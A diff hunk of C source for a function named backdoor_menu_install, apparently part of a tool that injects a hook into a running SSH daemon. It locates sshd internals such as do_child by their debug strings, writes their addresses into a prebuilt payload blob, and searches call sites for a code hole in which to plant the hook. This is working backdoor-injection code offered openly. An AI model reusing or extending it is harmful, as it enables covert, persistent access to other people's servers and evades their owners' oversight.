@@ -25,28 +25,29 @@ void backdoor_menu_install(inject_ctx *ctx) {
 	u8 *evil_bin;
 
 	evil_bin = malloc(hook_menu_bin_len);
+	u64 *import_table = (u64*)(evil_bin + 8); 
+
 	memcpy(evil_bin, hook_menu_bin, hook_menu_bin_len);
 
-	u64 child_set_env = sub_by_debugstr(ctx, "child_set_env: too many env vars");
-	info("child_set_env = 0x%llx", child_set_env);
+	//u64 child_set_env = sub_by_debugstr(ctx, "child_set_env: too many env vars");
+	//info("child_set_env = 0x%llx", child_set_env);
 
-	u64 process_input  = sub_by_debugstr(ctx, "This service allows sftp connections only.");
-	info("do_child = 0x%llx", process_input);
+	u64 do_child = sub_by_debugstr(ctx, "This service allows sftp connections only.");
+	info("do_child = 0x%llx", do_child);
 
 	u64 hole_addr = 0; 
 
 	info2("entering critical phase");
 
-	patch_placeholder(evil_bin, hook_menu_bin_len, 0xc0cac01ac0debabe, process_input);
-	patch_placeholder(evil_bin, hook_menu_bin_len, 0x1111111122222222, child_set_env);
-	patch_placeholder(evil_bin, hook_menu_bin_len, 0xc0debabe13371337, ctx->config_addr);
+	import_table[0] = ctx->config_addr;
+	import_table[1] = do_child; 
 
 	callcache = get_callcache();
 	callcache_total = get_callcachetotal();
 
 	for(i=0; i<callcache_total; i++) {
 		entry = &callcache[i];
-		if (entry->dest == process_input && entry->type == CALLCACHE_TYPE_CALL) {
+		if (entry->dest == do_child && entry->type == CALLCACHE_TYPE_CALL) {
 			if (hole_addr == 0) {
 				hole_addr = find_hole(ctx, entry->addr, 0x1000);
 				info("FIND HOLE %lx", hole_addr);
